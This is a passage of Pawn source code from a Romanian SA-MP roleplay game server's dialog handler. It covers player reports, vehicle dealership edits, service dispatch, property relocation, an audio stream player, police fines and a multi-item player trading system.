				case 4: ShowPlayerDialog(playerid, DIALOG_REPORT+1, DIALOG_STYLE_INPUT, "Alta problema", "Scrie problema pe care o ai.\nNu folosi comanda /report aiurea deoarece vei fi sanctionat.", "Ok", "Back");
			}
		}

		case DIALOG_REPORT+1: {
			if(!response) return ShowPlayerDialog(playerid, DIALOG_REPORT, DIALOG_STYLE_LIST, "Report", "Raporteaza DM\nRaporteaza un codat\nIntrebari despre donatii\nSunt blocat\nAlta problema", "Select", "Close");
			new type = listitemm[playerid], id = strval(inputtext);

			if(type != 4) {
				if(sscanf(inputtext, "u", id)) {
					ShowPlayerDialog(playerid, DIALOG_REPORT, DIALOG_STYLE_LIST, "Report", "Raporteaza DM\nRaporteaza un codat\nIntrebari despre donatii\nSunt blocat\nAlta problema", "Select", "Close");
					SendClientMessage(playerid, COLOR_GRAD3, "ID Invalid!");
					return true;
				}
				if(id == playerid) {
					ShowPlayerDialog(playerid, DIALOG_REPORT, DIALOG_STYLE_LIST, "Report", "Raporteaza DM\nRaporteaza un codat\nIntrebari despre donatii\nSunt blocat\nAlta problema", "Select", "Close");
					SendClientMessage(playerid, COLOR_GRAD4, "Nu te poti adauga pe tine in lista!");
					return true;
				}	
				if(!IsPlayerConnected(id)) {
					ShowPlayerDialog(playerid, DIALOG_REPORT, DIALOG_STYLE_LIST, "Report", "Raporteaza DM\nRaporteaza un codat\nIntrebari despre donatii\nSunt blocat\nAlta problema", "Select", "Close");
					SendClientMessage(playerid, COLOR_GRAD4, "Acel player nu este online!");
					return true;
				}
			}
			
			switch(type) {
				case 0: {
					format(gString, 180, "%s (%d) l-a raportat pe %s (%d) pentru DM.", GetName(playerid), playerid, GetName(id), id);
					SendAdminMessage(0xC9161FFF, gString, 1);
					report_type[id] = 1;
					value_report[id] ++;
					report_ago[id] = gettime();
					strmid(report_by[id], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
					Iter_Add(report_players, id);
					show_admin_report();
					return true;
				}
				case 1: {
					if(PlayerInfo[id][pAdmin] || PlayerInfo[id][pHelper])
						return SendClientMessage(playerid, COLOR_GREY, "Nu poti raporta un admin!");
					
					format(gString, 180, "%s (%d) l-a raportat pe %s (%d) pentru cheats.", GetName(playerid), playerid, GetName(id), id);
					report_type[playerid] = 2;
					value_report[playerid] ++;		
				}
				case 4: {
					format(gString, 180, "Report de la %s (ID: %d, lvl: %d): %s.", GetName(playerid), playerid, PlayerInfo[playerid][pLevel], inputtext);
					report_type[playerid] = 4;
					strmid(HelpText[playerid], inputtext, 0, 128);					
				}
				default: return true;
			}
			SendAdminMessage(0xC9161FFF, gString, 1);
			Iter_Add(report_players, playerid);
			show_admin_report();
					
			PlayerInfo[playerid][pReportTime] = gettime()+150;
			report_ago[playerid] = gettime();
			ReportTimer[playerid] = 150;
			SCMf(playerid, COLOR_LGREEN, "* Newbie %s: %s", GetName(playerid), inputtext);
		}
	
		case DIALOG_EDITVEHICLE: {
			if(!response) return SendClientMessage(playerid, COLOR_LGREEN, "Ai inchis dialogul!");
			switch(listitem) {
				case 0: ShowPlayerDialog(playerid, DIALOG_EDITVEHICLE+1, DIALOG_STYLE_INPUT, "Edit Value", "Scrie mai jos valoarea in pe care vrei sa modifici!", "Ok", "Exit");
				case 1: ShowPlayerDialog(playerid, DIALOG_EDITVEHICLE+1, DIALOG_STYLE_INPUT, "Edit Stock", "Scrie mai jos valoarea in pe care vrei sa modifici!", "Ok", "Exit");	
			}
			listitemm[playerid] = listitem;
		}
		case DIALOG_EDITVEHICLE+1: {
			if(!response) return SendClientMessage(playerid, COLOR_LGREEN, "Ai inchis dialogul!");
			listitem = listitemm[playerid];
			new idd = DealerID[playerid];
			switch(listitem) {
				case 0: {
					DSModels[idd][dPrice] = strval(inputtext);
					format(string, sizeof(string), "Noul pret al acestui vehicul este acum $%s!",FormatNumber(strval(inputtext)));
					SendClientMessage(playerid, COLOR_LGREEN, string);
					mysql_format(SQL, string, sizeof(string), "UPDATE `dsveh` SET `Price`='%i' WHERE `ID`='%i'", DSModels[idd][dPrice], DSModels[idd][dID]);
					mysql_tquery(SQL, string, "", "");
				}
				case 1: {
					DSModels[idd][dStock] = strval(inputtext);
					format(string, sizeof(string), "Stockurile la acest model au fost modificate in %d!",strval(inputtext));
					SendClientMessage(playerid, COLOR_LGREEN, string);
					mysql_format(SQL, string, sizeof(string), "UPDATE `dsveh` SET `Stock`='%i' WHERE `ID`='%i'", DSModels[idd][dStock], DSModels[idd][dID]);
					mysql_tquery(SQL, string, "", "");
				}			
			}
		}
	
		case DIALOG_CALLS: {
			if(!response) return true;
			new id = SelectedPlayers[playerid][listitem], f = listitemmm[playerid];

			if(!IsPlayerConnected(id)) 
				return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

			if(!Iter_Contains(servicePlayers<f>, id)) 
				return SendClientMessage(playerid, COLOR_GREY, "Acel player nu a apelat la acest serviciu!");

			if(AcceptedService[playerid] != -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Ai acceptat deja o comanda, pentru a renunta la cea curenta, foloseste '/cancel command'.");

			if(!FactionVehicle(playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu esti intr-un vehicul ce apartine factiunii tale!");	

			switch(f) {
				case 0: {
					format(gString, 180, "Taxi Dispatch: Taximetristul %s (%d) i-a acceptat comanda lui %s (%d).", GetName(playerid), playerid, GetName(id), id);
					SendFactionMessage(12, 0x2C6CBFFf, gString);
					SCMf(id, COLOR_YELLOW, "* Taximetristul %s ti-a preluat comanda.", GetName(playerid));
				}
				case 1: {
					format(gString, 180, "Uber Dispatch: Uberul %s (%d) i-a acceptat comanda lui %s (%d).", GetName(playerid), playerid, GetName(id), id);
					SendFactionMessage(15, 0x2C6CBFFf, gString);
					SCMf(id, COLOR_YELLOW, "* Uberul %s ti-a preluat comanda.", GetName(playerid));
				}
				case 2: {
					format(gString, 180, "Yango Dispatch: Uberul %s (%d) i-a acceptat comanda lui %s (%d).", GetName(playerid), playerid, GetName(id), id);
					SendFactionMessage(15, 0x2C6CBFFf, gString);
					SCMf(id, COLOR_YELLOW, "* Yango %s ti-a preluat comanda.", GetName(playerid));
				}
				case 3: {
					format(gString, 180, "Paramedic Dispatch: Paramedic %s (%d) i-a acceptat comanda lui %s (%d).",GetName(playerid), playerid, GetName(id), id);
					SendFactionMessage(13, COLOR_LIGHTBLUE, gString);
					SCMf(id, COLOR_YELLOW, "* Medicul %s ti-a acceptat comanda.", GetName(playerid));
				}	
				case 4: {
					format(gString, 180, "TTC Dispatch: Tow Truck Member %s (%d) i-a acceptat comanda lui %s (%d).", GetName(playerid), playerid, GetName(id), id);
					SendFactionMessage(8, COLOR_LIGHTBLUE, gString);
					SCMf(id, COLOR_WHITE, "* Mecanicul %s a acceptat apelul tau.", GetName(playerid));
				}
				case 5: {
					format(gString, 180, "SI Dispatch: Instructor %s (%d) i-a acceptat comanda lui %s (%d).", GetName(playerid), playerid, GetName(id), id);
					SendFactionMessage(7, COLOR_LIGHTBLUE, gString);
					SCMf(id, COLOR_YELLOW, "* Instructorul %s a acceptat apelul tau.", GetName(playerid));
				}	
				default: return true;	
			}	
			PlayerTextDrawSetPreviewModel(playerid, FindSkinTD, GetPlayerSkin(id));
			PlayerTextDrawShow(playerid, FindSkinTD);
			PlayerTextDrawShow(playerid, FindTD);
			AcceptedService[playerid] = id;
			Iter_Remove(servicePlayers<f>, id);
			targetfind[playerid] = id;
			UsedFind[playerid] = 1;
			CP[playerid] = 53;
		}
		
		case DIALOG_MOVEHOUSE: {
			if(!response) return true;
			new Float: Pos[3], id = GetPVarInt(playerid, "MoveID");
			GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
			switch(listitem) {
				case 0: {
					if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un interior!");
					HouseInfo[id][hExitx] = Pos[0];
					HouseInfo[id][hExity] = Pos[1];
					HouseInfo[id][hExitz] = Pos[2];
					HouseInfo[id][hInterior] = GetPlayerInterior(playerid);
					SendClientMessage(playerid, COLOR_LGREEN, "Interiorul casei a fost modificat!");
					gQuery[0] = EOS;
					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `houses` SET `Exitx`='%f', `Exity`='%f', `Exitz`='%f', `Interior`='%d' WHERE `ID`='%d'", Pos[0], Pos[1], Pos[2], GetPlayerInterior(playerid), HouseInfo[id][hID]);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 1: {
					if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Esti intr-un interior!");
					HouseInfo[id][hEntrancex] = Pos[0];
					HouseInfo[id][hEntrancey] = Pos[1];
					HouseInfo[id][hEntrancez] = Pos[2];
					SendClientMessage(playerid, COLOR_LGREEN, "Exteriorul casei a fost modificat!");
					DestroyDynamic3DTextLabel(HouseLabel[id]);
					HouseLabel[id] = CreateDynamic3DTextLabel("none", 0xFFFFFF00, HouseInfo[id][hEntrancex], HouseInfo[id][hEntrancey], HouseInfo[id][hEntrancez], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1,-1, -1, 100.0);
					UpdateLabel(1, id);
					mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Entrancex`='%f', `Entrancey`='%f', `Entrancez`='%f' WHERE `ID`='%d'", Pos[0], Pos[1], Pos[2], HouseInfo[id][hID]);
					mysql_tquery(SQL, query, "", "");
				}
			}
		}
		case DIALOG_MOVEBIZ: {
			if(!response) return true;
			new Float: Pos[3], id = GetPVarInt(playerid, "MoveID");
			GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
			gQuery[0] = EOS;
			switch(listitem) {
				case 0: {
					if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un interior!");
					BizzInfo[id][bExitX] = Pos[0];
					BizzInfo[id][bExitY] = Pos[1];
					BizzInfo[id][bExitZ] = Pos[2];
					BizzInfo[id][bInterior] = GetPlayerInterior(playerid);
					SendClientMessage(playerid, COLOR_LGREEN, "Interiorul afacerii a fost modificat!");
					UpdateLabel(2, id);
					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `bizz` SET `Exitx`='%f', `Exity`='%f', `Exitz`='%f', `Interior`='%d' WHERE `ID`='%d'", Pos[0], Pos[1], Pos[2], GetPlayerInterior(playerid), BizzInfo[id][bID]);
					mysql_tquery(SQL, gQuery, "", "");			
				}
				case 1: {
					if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Esti intr-un interior!");
					DestroyDynamicPickup(BizzInfo[id][bPickup]);
					BizzInfo[id][bEntranceX] = Pos[0];
					BizzInfo[id][bEntranceY] = Pos[1];
					BizzInfo[id][bEntranceZ] = Pos[2];
					BizzInfo[id][bPickup] = CreateDynamicPickup(BizzInfo[id][bType] != 19 ? 1239 : 1318, 1, BizzInfo[id][bEntranceX], BizzInfo[id][bEntranceY], BizzInfo[id][bEntranceZ], -1, -1, -1, 100.0);
					SendClientMessage(playerid, COLOR_LGREEN, "Exteriorul afacerii a fost modificat!");
					UpdateLabel(2, id);
					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `bizz` SET `Entrancex`='%f', `Entrancey`='%f', `Entrancez`='%f' WHERE `ID`='%d'", Pos[0], Pos[1], Pos[2], BizzInfo[id][bID]);
					mysql_tquery(SQL, gQuery, "", "");		
				}
			}
		}
		case DIALOG_TELEPORT: {
			if(!response) return true;
			switch(listitem) {
				case 0: {
					SetPlayerVirtualWorld(playerid, 1339);
					SetPlayerPos(playerid, -34.4762,2506.6443,17.2743);
					SetPlayerInterior(playerid, 0);		
				}
				case 1: {
					SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pMember]);
					SetPlayerPos(playerid, 257.5646,83.3177,1002.4453);
					SetPlayerInterior(playerid, 6);				
				}				
			}
		}	
		case DIALOG_MP3: {
			if(!response) return true;
			new i = listitem;
			if(i == 0) {
				if(Iter_Contains(RadioCount<PlayRadio[playerid]>, playerid)) Iter_Remove(RadioCount<PlayRadio[playerid]>, playerid);
				PlayRadio[playerid] = 0;
				StopAudioStreamForPlayer(playerid);
				RemovePlayerAttachedObject(playerid, 4);				
				return true;
			}
			if(i == sizeof(RadioLink)) ShowPlayerDialog(playerid, DIALOG_YOUTUBE, DIALOG_STYLE_INPUT, "Youtube custom URL", "Scrie mai jos link-ul de la videoclipul de pe YouTube:", "Ok", "Exit");
			else {							
				PlayAudioStreamForPlayer(playerid, RadioLink[i]);	
				PlayRadio[playerid] = i;
				Iter_Add(RadioCount<i>, playerid);
				SetPlayerAttachedObject(playerid, 4, 19421, 2, 0.050000, -0.014999, 0.000000, 95.000000, 183.000000, 89.000000, 1, 1, 1, 0xffffffff);
			}	
		}
		case DIALOG_YOUTUBE: {
			if(!response) return true;
			if(strfind(inputtext, "youtube", true) != -1) { }
			else return SendClientMessage(playerid, COLOR_GREY, "Invalid link!");			
			format(string, sizeof(string), "http://www.youtubeinmp3.com/fetch/?video=%s", inputtext);
			PlayAudioStreamForPlayer(playerid, string);
			SetPlayerAttachedObject(playerid, 4, 19421, 2, 0.050000, -0.014999, 0.000000, 95.000000, 183.000000, 89.000000, 1, 1, 1, 0xffffffff);
		}	
		case DIALOG_TICKET: {
			if(!response) return true;
			new giveplayerid = listitemm[playerid];
			if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");
			SCMf(playerid, COLOR_MONEY, "* I-ai dat lui %s o amenda in valoare de $%s, motiv: %s", GetName(giveplayerid), FormatNumber(50000 * PlayerInfo[giveplayerid][pLevel]), ticketName(listitem));
			SCMf(giveplayerid, COLOR_MONEY, "* Ofiter %s ti-a dat o amenda in valoare de $%s, motiv: %s, scrie /accept ticket %d pentru a accepta.", GetName(playerid), FormatNumber(50000 * PlayerInfo[giveplayerid][pLevel]), ticketName(listitem), playerid);
			TicketOffer[giveplayerid] = playerid;
			TicketMoney[giveplayerid] = 50000 * PlayerInfo[giveplayerid][pLevel];		
		}	
		case DIALOG_TRADE: {
			if(!response) return true;
			if(TradeReady[playerid] == 1 || TradeID[playerid] == -1) return true;
			switch(listitem) {
				case 0: {
					if(MoneyTrade[playerid] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja o suma de bani!");
					ShowPlayerDialog(playerid, DIALOG_TRADE1, DIALOG_STYLE_INPUT, "Trade Money (without billions)", "Pune mai jos suma de bani pe care o doresti sa o pui!\nInfo: daca suma depaseste $999,999,999 poti pune miliarde separat prin ultima optiune din trade.", "Ok", "Back");
				}
				case 1: {
					if(HouseTrade[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja casa!");
					if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) { }
					else return SendClientMessage(playerid, COLOR_WHITE, "Ai deja o casa.");
					AddTradeItem(playerid, 1, 0);
				}
				case 2: {
					if(BusinessTrade[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja afacerea!");
					if(PlayerInfo[playerid][pBizz] == 255) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai o afacere!");
					AddTradeItem(playerid, 2, 0);
				}		
				case 3: {
					if(CarTrade[playerid] != -1) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un vehicul!");
					
					if(Iter_Count(MyVehicle<playerid>) == 0) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un vehicul personal!");

					new x = 0; gQuery[0] = gString[0] = (EOS);
					foreach(new idd : MyVehicle<playerid>) {
						if(!CarInfo[idd][Spawned]) 
							continue;

						format(gQuery, 128, "%s {FFFFFF}%s - %s\n", !IsVehicleOccupied(CarInfo[idd][Spawned])?("{26B309}[spawned]"):("{F3C13A}[occupied]"), aVehicleNames[CarInfo[idd][cModel]-400], TotalUp(idd));
						strcat(gString, gQuery);
						PlayerInfo[playerid][pCarKey][x] = idd, x++;
					}
					ShowPlayerDialog(playerid, DIALOG_TRADE2, DIALOG_STYLE_LIST, "Trade vehicle", gString, "Ok", "Exit");
				}
				case 4: {
					if(SkinTrade[playerid] != -1) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un skin!");

					if(OnDuty[playerid])
						return SendClientMessage(playerid, COLOR_LIGHTGREEN, "Eroare: Nu poti pune un skin in trade pentru ca esti duty!");

					if(GetSkinRare(GetPlayerSkin(playerid)) != 1)
						return ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Trade Skin", "Nu poti pune acest skin", "Ok", "");

					format(gString, 128, "Esti sigur ca vrei sa dai skinul %d care este %s?", GetPlayerSkin(playerid), GetSkinType(GetPlayerSkin(playerid)));
					ShowPlayerDialog(playerid, DIALOG_TRADESKIN, DIALOG_STYLE_MSGBOX, "Trade Skin:", gString, "Select", "Cancel");
				}
				case 5: {
					if(HiddenTrade[playerid] != -1)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un hidden.");

					format(gString, 128, "Cate culori hidden doresti sa pui in aceasta afacere? (ai %d)", PlayerInfo[playerid][pHidden]);
					ShowPlayerDialog(playerid, DIALOG_TRADEHIDDEN, DIALOG_STYLE_INPUT, "Trade hidden color", gString, "Ok", "Back");
				}
				case 6: {
					if(jobTrade[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un job!");
					if(!PlayerInfo[playerid][pJobOwner]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un job!");
					
					AddTradeItem(playerid, 12, PlayerInfo[playerid][pJobOwner]);
				}
				case 7: {
					if(VoucherTrade[playerid][0] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un voucher rare!");
					ShowPlayerDialog(playerid, DIALOG_VOUCHERSS, DIALOG_STYLE_INPUT, "Trade Rare Voucher", "Pune mai jos suma de vouchere!", "Ok", "Back");
				}
				case 8: {
					if(VoucherTrade[playerid][1] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un voucher epic!");
					ShowPlayerDialog(playerid, DIALOG_VOUCHERSS1, DIALOG_STYLE_INPUT, "Trade Epic Voucher", "Pune mai jos suma de vouchere!", "Ok", "Back");
				}
				case 9: {
					if(VoucherTrade[playerid][2] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un voucher legendar!");
					ShowPlayerDialog(playerid, DIALOG_VOUCHERSS2, DIALOG_STYLE_INPUT, "Trade Legendary Voucher", "Pune mai jos suma de vouchere!", "Ok", "Back");
				}
				case 10: {
					if(MiliardTrade[playerid] != 0)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un miliard(s)!");

					ShowPlayerDialog(playerid, DIALOG_TRADEMILIARD, DIALOG_STYLE_INPUT, "Trade Money (with billions)", "Pune mai jos numarul de miliarde pe care vre sa-l pui!", "Ok", "Back");
				}
				case 11: {
					if(TradeTicket[playerid][0] != 0) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un rainbow tickets.");

					ShowPlayerDialog(playerid, DIALOG_TRADEVOUCHERR, DIALOG_STYLE_INPUT, "Trade Rainbow Tickets:", "Introdu suma de tickete pe care vrei sa o pui:", "Select", "Cancel");
				}
				case 12: {
					if(TradeTicket[playerid][1] != 0) 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un vip tickets.");

					ShowPlayerDialog(playerid, DIALOG_TRADEVOUCHERR, DIALOG_STYLE_INPUT, "Trade Vip Tickets:", "Introdu suma de tickete pe care vrei sa o pui:", "Select", "Cancel");
				}
				case 13: {
					if(VoucherTrade[playerid][3] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un voucher mythic!");
					ShowPlayerDialog(playerid, DIALOG_VOUCHERSS4, DIALOG_STYLE_INPUT, "Trade mythic Voucher", "Pune mai jos suma de vouchere!", "Ok", "Back");
				}
				case 14: {
					if(VoucherTrade[playerid][4] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un voucher Millionaries!");
					ShowPlayerDialog(playerid, DIALOG_VOUCHERSS5, DIALOG_STYLE_INPUT, "Trade Millionaries Voucher", "Pune mai jos suma de vouchere!", "Ok", "Back");
				}
				case 15: {
					if clan_trade[playerid] *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja un clan in trade.");

					if !PlayerInfo[playerid][pClan]||PlayerInfo[playerid][pClanRank]!=7 *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un clan.");

					new _c=PlayerInfo[playerid][pClan];
					format(gString, 128, "Esti sigur ca vrei sa pui clan-ul %s (#%d) in trade?", ClanInfo[_c][clName], ClanInfo[_c][cID]);
					ShowPlayerDialog(playerid, DIALOG_TRADECLAN, DIALOG_STYLE_MSGBOX, "Trade Clan", gString, "Da", "Nu");
				}
				case 16: {
					if hat_trade[playerid]!=-1 *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai adaugat deja un accesoriu.");

					new i=0; gString[0] = (EOS); strcat(gString, "#.\tHat Type\tStatus\n");
					while(i<11) format(gQuery, 128, "%d\t%s\t%s\n", (i++)+1, name_hats[i], PlayerInfo[playerid][pAccessories][i]?("{98FF5C}Unlocked"):("{FF5C5C}Locked")), strcat(gString, gQuery);
					ShowPlayerDialog(playerid, DIALOG_TRADEHATS, DIALOG_STYLE_TABLIST_HEADERS, "Trade: Your Hats", gString, "Select", "Cancel");
				}
				case 17: {
					if laser_trade[playerid]!=-1 *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai adaugat deja un accesoriu.");

					new i=-1; gString[0] = (EOS);
					while(++i<6) format(gQuery, 128, "%d. Laser %s - %s\n", i+1, laser_color[i], PlayerInfo[playerid][pAccessories][i+16]?("{98FF5C}Unlocked"):("{FF5C5C}Locked")), strcat(gString, gQuery);
					ShowPlayerDialog(playerid, DIALOG_TRADELASERS, DIALOG_STYLE_LIST, "Trade: Your Lasers", gString, "Select", "Cancel");
				}
				case 18: {
					if material_trade[playerid] *then 
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai pus deja materiale in trade!");

					ShowPlayerDialog(playerid, DIALOG_TRADEMATERIALS, DIALOG_STYLE_INPUT, "Trade Materials", "Pune mai jos numarul de materiale pe care vrei sa-l vinzi:", "Ok", "Back");
				}
				case 19: {
					if p_Ticket[playerid] *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai adaugat deja un premium ticket.");

					ShowPlayerDialog(playerid, DIALOG_TRADEPFUEL, DIALOG_STYLE_INPUT, "Trade Premium Fuel Ticket", "Introdu numarul de tickete pe care vrei sa le pui in trade.", "Ok", "Back");
				}
				case 20: {
					if c_Ticket[playerid] *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai adaugat deja un custom house ticket.");

					ShowPlayerDialog(playerid, DIALOG_TRADECUSTOM, DIALOG_STYLE_INPUT, "Trade Custom House Ticket", "Introdu numarul de tickete pe care vrei sa le pui in trade.", "Ok", "Back");
				}
			}
		}
		case DIALOG_TRADECUSTOM: {
			if !response *then
				return true;

			if !IsNumeric(inputtext) *then return true;

			new s=strval(inputtext);
			if PlayerInfo[playerid][pTickets][3]<s *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de tickete");

			AddTradeItem(playerid, 20, s);
		}
		case DIALOG_TRADEPFUEL: {
			if !response *then
				return true;

			if !IsNumeric(inputtext) *then return true;

			new s=strval(inputtext);
			if PlayerInfo[playerid][pTickets][2]<s *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de tickete");

			AddTradeItem(playerid, 19, s);
		}
		case DIALOG_TRADEMATERIALS: {
			if !response *then
				return true;

			if !IsNumeric(inputtext) *then return true;

			new s=strval(inputtext);
			if s<1||s>1000000 *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Poti pune intre (1 si 1.000.000 materiale)");

			if PlayerInfo[playerid][pMats]<s *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de materiale.");

			AddTradeItem(playerid, 18, s);
		}
		case DIALOG_TRADELASERS: {
			if !response *then
				return true;

			if !PlayerInfo[playerid][pAccessories][listitem+16] *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai acest tip de laser");

			AddTradeItem(playerid, 17, listitem);
		}
		case DIALOG_TRADEHATS: {
			if !response *then 
				return true;

			if !PlayerInfo[playerid][pAccessories][listitem] *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai acest tip de accesoriu.");

			AddTradeItem(playerid, 16, listitem);
		}
		case DIALOG_TRADECLAN: {
			if !response *then return true;

			AddTradeItem(playerid, 15, PlayerInfo[playerid][pClan]);
		}
		case DIALOG_TRADEMILIARD: {
			if(!response)
				return true;

			new amount = strval(inputtext);

			if(amount < 1)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Suma pe care ai introdus-o este invalida.");

			if(ByteVar1@money[playerid] < eBit:amount) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Value invalid.");

			AddTradeItem(playerid, 9, amount);
		}
		case DIALOG_TRADEVOUCHERR: {
			if(!response)
				return true;

			if(strval(inputtext) <= 0)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Suma invalida.");

			if(PlayerInfo[playerid][pTickets][0] < strval(inputtext))
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceste tickete.");

			AddTradeItem(playerid, 10, strval(inputtext));
		}
		case DIALOG_TRADEVOUCHERV: {
			if(!response)
				return true;

			if(strval(inputtext) <= 0)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Suma invalida.");

			if(PlayerInfo[playerid][pTickets][1] < strval(inputtext))
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceste tickete.");

			AddTradeItem(playerid, 11, strval(inputtext));
		}
		case DIALOG_TRADEHIDDEN: {
			if(!response)
				return true;

			new amount = strval(inputtext);
			if(amount <= 0)
				return SendClientMessage(playerid, COLOR_GREY, "Invalid.");

			if(PlayerInfo[playerid][pHidden] < amount)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suficiente hiddenuri.");

			AddTradeItem(playerid, 8, amount);
		}
		case DIALOG_TRADESKIN: {
			if(!response) return true;
			AddTradeItem(playerid, 7, GetPlayerSkin(playerid));
		}
		case DIALOG_TRADE1: {
			if(!response) return true;
			if(strval(inputtext) < 1 || strval(inputtext) > 999999999) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Poti pune in trade $1 si $999.999.999");
			if(GetPlayerCash(playerid) < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			AddTradeItem(playerid, 0, strval(inputtext));
		}
		case DIALOG_TRADE2: {
			if(!response) return true;
			new idd = PlayerInfo[playerid][pCarKey][listitem];
			if(CarInfo[idd][Spawned] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel vehicul nu este spawnat!");
			
			AddTradeItem(playerid, 3, idd);
		}
		case DIALOG_VOUCHERSS: {
			if(!response) return true;
			if(strval(inputtext) < 1) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			if(PlayerInfo[playerid][pVoucher][0] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			AddTradeItem(playerid, 4, strval(inputtext));
		}
		case DIALOG_VOUCHERSS1: {
			if(!response) return true;
			if(strval(inputtext) < 1) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			if(PlayerInfo[playerid][pVoucher][1] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			AddTradeItem(playerid, 5, strval(inputtext));
		}
		case DIALOG_VOUCHERSS2: {
			if(!response) return true;
			if(strval(inputtext) < 1) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			if(PlayerInfo[playerid][pVoucher][2] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			AddTradeItem(playerid, 6, strval(inputtext));
		}
		case DIALOG_VOUCHERSS4: {
			if(!response) return true;
			if(strval(inputtext) < 1) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			if(PlayerInfo[playerid][pVoucher][3] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			AddTradeItem(playerid, 13, strval(inputtext));
		}
		case DIALOG_VOUCHERSS5: {
			if(!response) return true;
			if(strval(inputtext) < 1) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			if(PlayerInfo[playerid][pVoucher][4] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "Suma invalida!");
			AddTradeItem(playerid, 14, strval(inputtext));
		}
		case DIALOG_DILDO: { 
			if(!response) return true;
			switch(listitem) {
				case 0: {
					if(GetPlayerCash(playerid) < 50000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai banii necesari pentru a cumpara acest lucru!");
					ServerWeapon(playerid, 11, 1);
					GivePlayerCash(playerid, -50000);
					SendClientMessage(playerid,COLOR_WHITE,"Ai cumparat Dildo.");
					BizzInfo[6][bBalance] += 50000;
				}
				case 1: {
					if(GetPlayerCash(playerid) < 50000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai banii necesari pentru a cumpara acest lucru!");
